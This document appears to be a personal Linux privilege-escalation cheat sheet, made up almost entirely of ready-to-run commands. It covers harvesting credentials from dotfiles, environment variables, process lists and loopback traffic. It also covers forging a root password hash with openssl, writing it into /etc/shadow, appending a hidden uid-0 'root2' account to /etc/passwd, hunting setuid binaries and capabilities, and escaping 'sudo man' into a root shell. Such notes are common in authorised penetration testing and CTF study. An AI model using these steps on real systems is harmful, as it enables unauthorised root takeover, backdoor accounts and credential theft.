check for credentials and other goodies in users' dotfiles (.bashrc, .bash_history, etc.)

`env` to display environmental variables that could be interesting

`sudo -l` to list current user's sudo privs

`watch -n 1 "ps -aux | grep pass"`
`sudo tcpdump -i lo -A | grep "pass"`

Step 1: The following command will look for files (and not symlinks etc) which is world writable. 
Command: `find / -not -type l -perm -o+w`

if /etc/shadow is world-writable and root password is not set, generate a root password and insert it into /etc/shadow to gain root access with known creds
`openssl passwd -1 -salt abc password`
copy the outputted password and enter it into /etc/shadow

if /etc/passwd is world-writable (or writeable by a user we've obtained), you can do the openssl command above, then create a passwd entry with a password hash in position 2:
`echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd`
uid 0 gid 0 give it root

find setuid programs
`find / -user root -perm -4000 -exec ls -ldb {} \;`

`/usr/sbin/getcap -r / 2>/dev/null`

sudo capabilities
`sudo -l`

if `sudo man` can be run without password, run it and launch /bin/bash from inside
`sudo man ls`
`!/bin/bash`

check cron log for running cron jobs
`grep "CRON" /var/log/syslog`
